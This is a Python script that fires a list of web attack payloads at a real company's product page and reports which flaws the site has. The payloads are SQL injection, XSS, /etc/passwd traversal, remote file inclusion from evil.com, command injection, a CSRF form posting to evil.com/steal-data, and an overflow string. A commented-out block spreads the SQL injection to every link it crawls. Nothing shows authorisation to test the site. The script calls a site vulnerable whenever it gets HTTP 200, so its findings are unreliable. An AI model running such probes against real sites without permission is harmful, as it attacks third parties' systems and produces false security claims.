# Importing packages
import requests
import re
# Defining the website URL
url = "https://prose.com/products/custom-shampoo"

#"https://prose.com/",
 
# Testing for SQL injection
sql_payload = "' OR 1=1--"
response = requests.get(url + sql_payload)

# Checking for SQL injection response
if response.status_code == 200:
    print("Website is vulnerable to SQL injection.")
else:
    print("Website is not vulnerable to SQL injection.")


# Testing for cross-site scripting
xss_payload = "<script>alert('XSS')</script>"
response = requests.get(url + xss_payload)

# Checking for cross-site scripting response
if response.status_code == 200:
    print("Website is vulnerable to cross-site scripting.")
else:
    print("Website is not vulnerable to cross-site scripting.")


# Testing for directory traversal
dir_traversal_payload = "../../../etc/passwd"
response = requests.get(url + dir_traversal_payload)

# Checking for directory traversal response
if response.status_code == 200:
    print("Website is vulnerable to directory traversal.")
else:
    print("Website is not vulnerable to directory traversal.")


# Testing for remote file inclusion
rfi_payload = "?file=http://evil.com/shell.txt"
response = requests.get(url + rfi_payload)

# Checking for remote file inclusion response
if response.status_code == 200:
    print("Website is vulnerable to remote file inclusion.")
else:
    print("Website is not vulnerable to remote file inclusion.")


# Testing for buffer overflow
buffer_overflow_payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
response = requests.get(url + buffer_overflow_payload)

# Checking for buffer overflow response
if response.status_code == 200:
    print("Website is vulnerable to buffer overflow.")
else:
    print("Website is not vulnerable to buffer overflow.")


# Testing for command injection
cmd_injection_payload = "; ls"
response = requests.get(url + cmd_injection_payload)

# Checking for command injection response
if response.status_code == 200:
    print("Website is vulnerable to command injection.")
else:
    print("Website is not vulnerable to command injection.")

# Testing for cross-site request forgery
csrf_payload = "<form action='http://evil.com/steal-data' method='POST'><input type='submit' value='Submit'></form>"
response = requests.post(url, data=csrf_payload)

# Checking for cross-site request forgery response
if response.status_code == 200:
    print("Website is vulnerable to cross-site request forgery.")
else:
    print("Website is not vulnerable to cross-site request forgery.")


# Testing for clickjacking
clickjacking_payload = "<iframe src='http://evil.com' width='100' height='100'></iframe>"
response = requests.get(url + clickjacking_payload)

# Checking for clickjacking response
if response.status_code == 200:
    print("Website is vulnerable to clickjacking.")
else:
    print("Website is not vulnerable to clickjacking.")

# Testing for insecure direct object reference
idor_payload = "?id=0"
response = requests.get(url + idor_payload)

# Checking for insecure direct object reference response
if response.status_code == 200:
    print("Website is vulnerable to insecure direct object reference.")
else:
    print("Website is not vulnerable to insecure direct object reference.")

# Testing for insecure cryptographic storage
crypto_payload = "?password=test123"
response = requests.get(url + crypto_payload)

# Checking for insecure cryptographic storage response
if response.status_code == 200:
    print("Website is vulnerable to insecure cryptographic storage.")
else:
    print("Website is not vulnerable to insecure cryptographic storage.")



# # Fetching the website content
# response = requests.get(url)
# content = response.text

# # Finding all URLs
# url_pattern = re.compile(r"(http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?")
# urls = url_pattern.findall(content)

# # Iterating over the URLs
# for url in urls:
#     # Converting tuple to string
#     url_string = ''.join(url)
#     # Testing for SQL injection
#     sql_payload = "' OR 1=1--"
#     response = requests.get(url_string + sql_payload)
#     # Checking response
#     if response.status_code == 200:
#         print("SQL injection vulnerability found!")